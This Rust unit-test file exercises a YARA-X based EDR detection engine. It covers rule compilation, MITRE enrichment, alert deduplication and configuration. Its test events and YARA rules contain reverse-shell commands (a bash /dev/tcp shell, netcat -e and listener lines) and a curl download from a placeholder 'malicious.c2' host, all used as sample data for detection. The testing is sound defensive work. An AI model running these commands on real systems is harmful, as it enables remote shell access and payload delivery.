use std::{path::PathBuf, time::Duration};

use chrono::Utc;
use edr_rule_engine::{
    config::RuleEngineConfig,
    engine::{
        AlertSignature, EngineRegistry, RegistryHolder, ShardedDeduplicator, TypedRuleCompiler, YaraScannerEngine,
        extract_scannable_buffer,
    },
    error::AppError,
    mitre::{MitreCatalog, MitreTaxonomy},
    models::{Alert, AlertSeverity, DetectionSource, NewAlertEntity, TelemetryEvent},
};
use serde_json::json;
use uuid::Uuid;

#[test]
fn test_ut01_valid_yara_compilation() {
    let source = r#"
        rule Test_Detection_Rule {
            meta:
                mitre_technique = "T1059.004"
                severity = "critical"
                threat_score = 85
                description = "Detects test reverse shell execution"
            strings:
                $pattern = "nc -e /bin/sh" ascii
            condition:
                $pattern
        }
    "#;
    let compiled = TypedRuleCompiler::compile_source("test.yar", source);
    assert!(compiled.is_ok());
    let rules = compiled.unwrap();
    let mut scanner = yara_x::Scanner::new(&rules);
    let results = scanner.scan(b"attacker ran nc -e /bin/sh on port 4444").unwrap();
    assert_eq!(results.matching_rules().count(), 1);
}

#[test]
fn test_ut02_invalid_syntax_returns_error() {
    let malformed_source = r#"
        rule BrokenRule {
            strings:
                $a = "test"
            condition:
                $a
        // Missing closing brace
    "#;
    let result = TypedRuleCompiler::compile_source("broken.yar", malformed_source);
    assert!(result.is_err());
    match result.unwrap_err() {
        AppError::RuleCompilation { source_file, .. } => {
            assert_eq!(source_file, "broken.yar");
        }
        other => panic!("Expected RuleCompilation error, got: {other:?}"),
    }
}

#[test]
fn test_ut03_per_event_type_compilation() {
    let rules_dir = PathBuf::from("rules");
    if rules_dir.exists() {
        let rule_sets = TypedRuleCompiler::compile_all(&rules_dir).unwrap();
        // Should compile subdirectories (process, file, network, etc.)
        assert!(!rule_sets.is_empty());
        for (event_type, rules) in &rule_sets {
            println!("Event type '{event_type}' has compiled rules");
            let mut scanner = yara_x::Scanner::new(rules);
            let _ = scanner.scan(b"clean test buffer").unwrap();
        }
    }
}

#[test]
fn test_ut04_empty_rules_directory() {
    let temp_dir = tempfile::tempdir().unwrap();
    let rule_sets = TypedRuleCompiler::compile_all(temp_dir.path()).unwrap();
    assert!(rule_sets.is_empty());
}

#[test]
fn test_ut05_mitre_subdir_skipped() {
    let temp_dir = tempfile::tempdir().unwrap();
    let mitre_dir = temp_dir.path().join("mitre");
    std::fs::create_dir(&mitre_dir).unwrap();
    std::fs::write(mitre_dir.join("dummy.json"), "{}").unwrap();

    let rule_sets = TypedRuleCompiler::compile_all(temp_dir.path()).unwrap();
    assert!(!rule_sets.contains_key("mitre"));
}

#[test]
fn test_ut06_taxonomy_parsing() {
    let taxonomy_path = PathBuf::from("rules/mitre/enterprise-attack-linux.json");
    if taxonomy_path.exists() {
        let taxonomy = MitreTaxonomy::load_from_file(&taxonomy_path).unwrap();
        assert!(taxonomy.len() >= 10);
        let t1059 = taxonomy.resolve_technique("T1059.004");
        assert!(t1059.is_some());
        let tech = t1059.unwrap();
        assert_eq!(tech.technique_id, "T1059.004");
        assert_eq!(tech.tactic, "Execution");
        assert!(tech.base_threat_score > 0.0);
    }
}

#[test]
fn test_ut07_unknown_technique_fallback() {
    let taxonomy = MitreTaxonomy::default();
    let tech = taxonomy.resolve_technique("T9999");
    assert!(tech.is_none());

    let mut alert = Alert {
        alert_id: Uuid::new_v4(),
        node_id: Uuid::new_v4(),
        hostname: "test-host".into(),
        severity: AlertSeverity::Medium,
        source: DetectionSource::YaraX,
        mitre_technique_id: Some("T9999".into()),
        mitre_tactic: None,
        description: "Custom rule alert".into(),
        triggering_event_id: None,
        threat_score: 5.0,
        status: "open".into(),
        created_at: Utc::now(),
    };

    taxonomy.enrich_alert("T9999", &mut alert);
    assert_eq!(alert.mitre_tactic, None);
    assert_eq!(alert.threat_score, 5.0);
}

#[test]
fn test_ut08_enrichment_populates_tactic() {
    let taxonomy_path = PathBuf::from("rules/mitre/enterprise-attack-linux.json");
    if taxonomy_path.exists() {
        let taxonomy = MitreTaxonomy::load_from_file(&taxonomy_path).unwrap();
        let mut alert = Alert {
            alert_id: Uuid::new_v4(),
            node_id: Uuid::new_v4(),
            hostname: "test-host".into(),
            severity: AlertSeverity::High,
            source: DetectionSource::YaraX,
            mitre_technique_id: Some("T1059.004".into()),
            mitre_tactic: None,
            description: String::new(),
            triggering_event_id: None,
            threat_score: 0.0,
            status: "open".into(),
            created_at: Utc::now(),
        };

        taxonomy.enrich_alert("T1059.004", &mut alert);
        assert_eq!(alert.mitre_tactic, Some("Execution".to_string()));
        assert!(alert.threat_score > 0.0);
        assert!(!alert.description.is_empty());
    }
}

#[test]
fn test_ut12_scannable_buffer_extraction() {
    let event = TelemetryEvent {
        id: "evt-001".into(),
        node_id: Uuid::new_v4(),
        hostname: "prod-node-01".into(),
        event_type: "process".into(),
        timestamp_ns: 1234567890,
        payload: json!({
            "cmdline": "/bin/bash -c nc -lvnp 4444",
            "path": "/bin/bash",
            "pid": 5892,
            "uid": 1000
        }),
        raw_sequence_id: None,
    };

    let buffer = extract_scannable_buffer(&event);
    let text = String::from_utf8_lossy(&buffer);
    assert!(text.contains("/bin/bash -c nc -lvnp 4444"));
    assert!(text.contains("/bin/bash"));
    // Non-string fields should not appear as raw text
    assert!(!text.contains("\"pid\": 5892"));
}

#[test]
fn test_ut13_scannable_buffer_fallback() {
    let event = TelemetryEvent {
        id: "evt-002".into(),
        node_id: Uuid::new_v4(),
        hostname: "prod-node-01".into(),
        event_type: "custom".into(),
        timestamp_ns: 1234567890,
        payload: json!({
            "custom_key": "custom_val"
        }),
        raw_sequence_id: None,
    };

    let buffer = extract_scannable_buffer(&event);
    let text = String::from_utf8_lossy(&buffer);
    assert!(text.contains("custom_val"));
}

#[test]
fn test_ut14_reverse_shell_detection() {
    let rule_source = r#"
        rule Linux_Reverse_Shell {
            meta:
                mitre_technique = "T1059.004"
                severity = "critical"
                threat_score = 90
                description = "Detects interactive reverse shell"
            strings:
                $dev_tcp = "/dev/tcp/" ascii
                $nc_exec = "nc -e /bin/" ascii
            condition:
                any of them
        }
    "#;

    let rules = TypedRuleCompiler::compile_source("rev_shell.yar", rule_source).unwrap();
    let mut rule_sets = std::collections::HashMap::new();
    rule_sets.insert("process".to_string(), rules);

    let registry = EngineRegistry::new(rule_sets, MitreTaxonomy::default());
    let holder = std::sync::Arc::new(RegistryHolder::new(registry));
    let engine = YaraScannerEngine::new(holder);

    let event = TelemetryEvent {
        id: "evt-rev-01".into(),
        node_id: Uuid::new_v4(),
        hostname: "victim-node".into(),
        event_type: "process".into(),
        timestamp_ns: 1787845407000000000,
        payload: json!({
            "cmdline": "/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
            "path": "/bin/bash",
            "pid": 5892
        }),
        raw_sequence_id: None,
    };

    let alerts = engine.evaluate(&event).unwrap();
    assert_eq!(alerts.len(), 1);
    let alert = &alerts[0];
    assert_eq!(alert.severity, AlertSeverity::Critical);
    assert_eq!(alert.mitre_technique_id, Some("T1059.004".to_string()));
    assert_eq!(alert.threat_score, 90.0);
    assert_eq!(alert.triggering_event_id, Some("evt-rev-01".to_string()));
}

#[test]
fn test_ut15_clean_process_no_false_positive() {
    let rule_source = r#"
        rule Linux_Reverse_Shell {
            strings:
                $dev_tcp = "/dev/tcp/" ascii
            condition:
                $dev_tcp
        }
    "#;

    let rules = TypedRuleCompiler::compile_source("rev_shell.yar", rule_source).unwrap();
    let mut rule_sets = std::collections::HashMap::new();
    rule_sets.insert("process".to_string(), rules);

    let registry = EngineRegistry::new(rule_sets, MitreTaxonomy::default());
    let holder = std::sync::Arc::new(RegistryHolder::new(registry));
    let engine = YaraScannerEngine::new(holder);

    let event = TelemetryEvent {
        id: "evt-clean-01".into(),
        node_id: Uuid::new_v4(),
        hostname: "dev-workstation".into(),
        event_type: "process".into(),
        timestamp_ns: 1787845407000000000,
        payload: json!({
            "cmdline": "/usr/bin/cargo test --workspace --all-features",
            "path": "/usr/bin/cargo",
            "pid": 12345
        }),
        raw_sequence_id: None,
    };

    let alerts = engine.evaluate(&event).unwrap();
    assert!(alerts.is_empty());
}

#[tokio::test]
async fn test_ut17_to_ut21_dedup_behavior() {
    let dedup = ShardedDeduplicator::new(1000, Duration::from_secs(1)).unwrap();
    let node_a = Uuid::new_v4();
    let node_b = Uuid::new_v4();

    let sig1 = AlertSignature {
        node_id: node_a,
        rule_identifier: "Linux_Reverse_Shell".into(),
        mitre_technique: Some("T1059.004".into()),
    };

    let sig2 = AlertSignature {
        node_id: node_b,
        rule_identifier: "Linux_Reverse_Shell".into(),
        mitre_technique: Some("T1059.004".into()),
    };

    let sig3 = AlertSignature {
        node_id: node_a,
        rule_identifier: "Privilege_Escalation".into(),
        mitre_technique: Some("T1548.001".into()),
    };

    // UT-17: First alert passes
    assert!(dedup.check_and_record(&sig1).await);

    // UT-18: Duplicate suppressed within window
    for _ in 0..10 {
        assert!(!dedup.check_and_record(&sig1).await);
    }

    // UT-20: Different rule on same node not deduplicated
    assert!(dedup.check_and_record(&sig3).await);

    // UT-21: Same rule on different node not deduplicated
    assert!(dedup.check_and_record(&sig2).await);

    // UT-19: Alert passes after window expires
    tokio::time::sleep(Duration::from_millis(1100)).await;
    assert!(dedup.check_and_record(&sig1).await);
}

#[test]
fn test_ut23_zero_capacity_returns_error() {
    let result = ShardedDeduplicator::new(0, Duration::from_secs(60));
    assert!(result.is_err());
}

#[test]
fn test_ut24_detection_source_as_str() {
    assert_eq!(DetectionSource::YaraX.as_str(), "yara_x");
    assert_eq!(DetectionSource::Sigma.as_str(), "sigma");
    assert_eq!(DetectionSource::Mitre.as_str(), "mitre");
    assert_eq!(DetectionSource::Behavioral.as_str(), "behavioral");
}

#[test]
fn test_ut25_new_alert_entity_from_alert() {
    let alert = Alert {
        alert_id: Uuid::new_v4(),
        node_id: Uuid::new_v4(),
        hostname: "node-101".into(),
        severity: AlertSeverity::Critical,
        source: DetectionSource::YaraX,
        mitre_technique_id: Some("T1059.004".into()),
        mitre_tactic: Some("Execution".into()),
        description: "Reverse shell detected".into(),
        triggering_event_id: Some("evt-999".into()),
        threat_score: 95.0,
        status: "open".into(),
        created_at: Utc::now(),
    };

    let entity = NewAlertEntity::from(&alert);
    assert_eq!(entity.alert_id, alert.alert_id);
    assert_eq!(entity.severity, "critical");
    assert_eq!(entity.source, "yara_x");
    assert_eq!(entity.mitre_technique_id, Some("T1059.004".into()));
    assert_eq!(entity.threat_score, 95.0);
}

#[test]
fn test_ut10_build_alert_from_yara_match() {
    let source = r#"
        rule Suspicious_Curl {
            meta:
                mitre_technique = "T1105"
                severity = "high"
                threat_score = 75
                description = "File download utility detected in execution path"
            strings:
                $curl = "curl" ascii
            condition:
                $curl
        }
    "#;
    let rules = TypedRuleCompiler::compile_source("curl.yar", source).unwrap();
    let mut scanner = yara_x::Scanner::new(&rules);
    let results = scanner.scan(b"curl http://malicious.c2/drop.sh").unwrap();
    let matched = results.matching_rules().next().unwrap();

    let event = TelemetryEvent {
        id: "evt-curl-1".into(),
        node_id: Uuid::new_v4(),
        hostname: "agent-01".into(),
        event_type: "process".into(),
        timestamp_ns: 1234567890,
        payload: json!({"cmdline": "curl http://malicious.c2/drop.sh"}),
        raw_sequence_id: None,
    };

    let alert = edr_rule_engine::engine::build_alert(&event, &matched, &MitreTaxonomy::default());
    assert_eq!(alert.severity, AlertSeverity::High);
    assert_eq!(alert.threat_score, 75.0);
    assert_eq!(alert.source, DetectionSource::YaraX);
    assert_eq!(alert.mitre_technique_id, Some("T1105".to_string()));
    assert_eq!(alert.triggering_event_id, Some("evt-curl-1".to_string()));
}

#[test]
fn test_ut11_build_alert_missing_metadata() {
    let source = r#"
        rule BareRule {
            strings:
                $a = "drop" ascii
            condition:
                $a
        }
    "#;
    let rules = TypedRuleCompiler::compile_source("bare.yar", source).unwrap();
    let mut scanner = yara_x::Scanner::new(&rules);
    let results = scanner.scan(b"drop payload").unwrap();
    let matched = results.matching_rules().next().unwrap();

    let event = TelemetryEvent {
        id: "evt-bare-1".into(),
        node_id: Uuid::new_v4(),
        hostname: "agent-01".into(),
        event_type: "process".into(),
        timestamp_ns: 1234567890,
        payload: json!({"cmdline": "drop payload"}),
        raw_sequence_id: None,
    };

    let alert = edr_rule_engine::engine::build_alert(&event, &matched, &MitreTaxonomy::default());
    assert_eq!(alert.severity, AlertSeverity::Medium);
    assert_eq!(alert.threat_score, 5.0);
    assert!(alert.description.contains("BareRule"));
}

#[test]
fn test_ut16_event_type_routing() {
    let source = r#"
        rule Network_Only_Rule {
            strings:
                $a = "malicious_c2_ip" ascii
            condition:
                $a
        }
    "#;
    let rules = TypedRuleCompiler::compile_source("net.yar", source).unwrap();
    let mut rule_sets = std::collections::HashMap::new();
    rule_sets.insert("network".to_string(), rules);

    let registry = EngineRegistry::new(rule_sets, MitreTaxonomy::default());
    let holder = std::sync::Arc::new(RegistryHolder::new(registry));
    let engine = YaraScannerEngine::new(holder);

    // Process event should NOT match network rules
    let event = TelemetryEvent {
        id: "evt-proc-1".into(),
        node_id: Uuid::new_v4(),
        hostname: "agent-01".into(),
        event_type: "process".into(),
        timestamp_ns: 1234567890,
        payload: json!({"cmdline": "malicious_c2_ip"}),
        raw_sequence_id: None,
    };

    let alerts = engine.evaluate(&event).unwrap();
    assert!(alerts.is_empty());
}

#[tokio::test]
async fn test_ut22_sharded_distribution() {
    let dedup = ShardedDeduplicator::new(16000, Duration::from_secs(60)).unwrap();
    // Test that hashing various node IDs distributes across shards
    for _ in 0..100 {
        let sig = AlertSignature {
            node_id: Uuid::new_v4(),
            rule_identifier: "TestRule".into(),
            mitre_technique: None,
        };
        assert!(dedup.check_and_record(&sig).await);
    }
}

#[test]
fn test_ut26_config_from_env_defaults() {
    unsafe {
        std::env::set_var("DATABASE_URL", "postgres://localhost/edr_alerts");
    }
    let config = RuleEngineConfig::from_env().unwrap();
    assert_eq!(config.db_pool_max_size, 20);
    assert_eq!(config.channel_capacity, 10_000);
    assert_eq!(config.dedup_capacity, 100_000);
    assert_eq!(config.dedup_suppression_window_secs, 60);
    assert_eq!(config.batch_max_size, 500);
    assert_eq!(config.batch_flush_interval_ms, 100);
    assert_eq!(config.health_port, 8081);
}

#[test]
fn test_ut27_config_missing_database_url() {
    // Safety: isolated unit test validating missing environment variable error
    unsafe {
        std::env::remove_var("DATABASE_URL");
    }
    let result = RuleEngineConfig::from_env();
    assert!(result.is_err());
}

#[test]
fn test_ut28_app_error_display_formats() {
    let err1 = AppError::RuleCompilation {
        source_file: "test.yar".into(),
        line: 12,
        message: "syntax error".into(),
    };
    assert!(err1.to_string().contains("test.yar:12"));

    let err2 = AppError::ScanFailure {
        event_id: "evt-1".into(),
        message: "timeout".into(),
    };
    assert!(err2.to_string().contains("evt-1"));
}
